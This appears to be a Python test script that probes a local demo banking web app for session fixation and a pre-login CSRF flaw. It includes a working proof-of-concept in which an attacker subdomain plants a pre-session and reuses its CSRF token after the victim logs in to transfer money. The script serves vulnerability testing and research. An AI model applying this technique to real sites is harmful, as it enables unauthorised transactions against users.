import requests, random
from bs4 import BeautifulSoup
import os


try:
    PROTOCOL = os.environ['PROTOCOL']
except:
    PROTOCOL = 'http'
TARGET = f'{PROTOCOL}://localtest.me/'
ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'


USER1 = 'alice'
PASSWORD1 = USER1
ammount1 = 100
ammount2 = 200


session_cookie_name = 'koa.sess'
session_cookie_sig = 'koa.sess.sig'
csrf_form_id = 'csrf_token'
csrf_form_name = '_csrf'

LOGOUT_MESSAGE = '<button type="submit">Login</button>'
CSRF_FAIL_WITHOUT_LOGIN = 'Please login first.'
INVALID_TOKEN = 'Invalid CSRF token'


def get_csrf_token(page):
    return BeautifulSoup(page, 'html.parser').find(id = csrf_form_id).attrs['value']

def login_express(user, password):
    r = s.get(TARGET + 'login')
    assert 'Login' in r.text

    # pre_session_cookie = s.cookies.get_dict()[session_cookie_name]
    pre_session_cookie = s.cookies._cookies['localtest.me']['/'][session_cookie_name]

    data = {'username' : user, 'password' : password}
    r = s.post(TARGET + 'login', data = data)

    ### Welcome message
    assert f'Welcome {user}.' in r.text

    # post_session_cookie = s.cookies.get_dict()[session_cookie_name]
    post_session_cookie = s.cookies._cookies['localtest.me']['/'][session_cookie_name]
    assert pre_session_cookie != post_session_cookie, "Vulnerable to session fixation"

    return r

def logout_express():
    r = s.get(TARGET + 'logout')
    assert LOGOUT_MESSAGE in r.text

def transfer_express(target, ammount, csrf_token):
    data = {'ammount' : ammount, 'target' : target, csrf_form_name : csrf_token}
    return s.post(TARGET + 'transfer', data = data)

def get_balance(page):
    return int(page.split("Your <b>balance</b> is ")[1].split('<br>')[0])



### Test correct functionality
with requests.Session() as s:
    print("[+] Testing login")

    ### Access main page
    r = s.get(TARGET, verify = PRIVATE_KEY)
    assert LOGOUT_MESSAGE in r.text

    ### Fail to perform CSRF protected operation
    csrf_token = get_csrf_token(r.text)
    r = transfer_express(USER1, 100, csrf_token)
    assert CSRF_FAIL_WITHOUT_LOGIN in r.text

    ### Login
    r = login_express(USER1, PASSWORD1)

    ### Success performing CSRF protected operation
    current_balance = get_balance(r.text)
    csrf_token = get_csrf_token(r.text)

    r = transfer_express('attacker', ammount1, csrf_token)
    assert f"Successfully transferred {ammount1} from {USER1} to attacker" in r.text
    current_balance -= ammount1

    r = s.get(TARGET)
    assert f'Welcome {USER1}.' in r.text
    assert str(current_balance) in r.text

    ### Logout
    logout_express()

    print("  - Correct behaviour confirmed")


with requests.Session() as s:
    print("[+] Trying pre-login without fixation")

    r_target = s.get(TARGET, verify = PRIVATE_KEY)
    assert LOGOUT_MESSAGE in r_target.text

    ### TARGET LOGIN
    r_target = login_express(USER1, PASSWORD1)
    assert current_balance == get_balance(r_target.text)

    ### ATTACKER tries performing CSRF protected operation on behalf uf USER1 WITHOUT pre-fixating the secret
    ### Attacker (wrongly) Setting Pre-Session
    s.get(ATTACKER, verify = PRIVATE_KEY)
    r_attacker = s.get(ATTACKER + 'set_pre_session')
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    r_attacker = transfer_express('attacker', ammount2, csrf_token_attacker)
    assert r_attacker.status_code == 403
    assert INVALID_TOKEN in r_attacker.text

    logout_express()

    print("  - CSRF attack failed without pre-session")


print("[+] Sanity Checks passed")

with requests.Session() as s:
    print("[+] Testing pre-login CSRF attack")

    r_target = s.get(TARGET, verify = PRIVATE_KEY)
    assert LOGOUT_MESSAGE in r_target.text

    ### Attacker Setting Pre-Session
    s.get(ATTACKER, verify = PRIVATE_KEY)
    r_attacker = s.get(ATTACKER + 'set_pre_session')
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)


    ### TARGET LOGIN
    r_target = login_express(USER1, PASSWORD1)
    assert current_balance == get_balance(r_target.text)

    ### ATTACKER Succeeds in performing CSRF protected operation on behalf uf USER1
    r_attacker = transfer_express('attacker', ammount2, csrf_token_attacker)
    assert f"Successfully transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
    current_balance -= ammount2

    r = s.get(TARGET)
    assert f'Welcome {USER1}.' in r.text
    assert str(current_balance) in r.text

    logout_express()

    print("  - Vulnerable to pre-login CSRF attack")
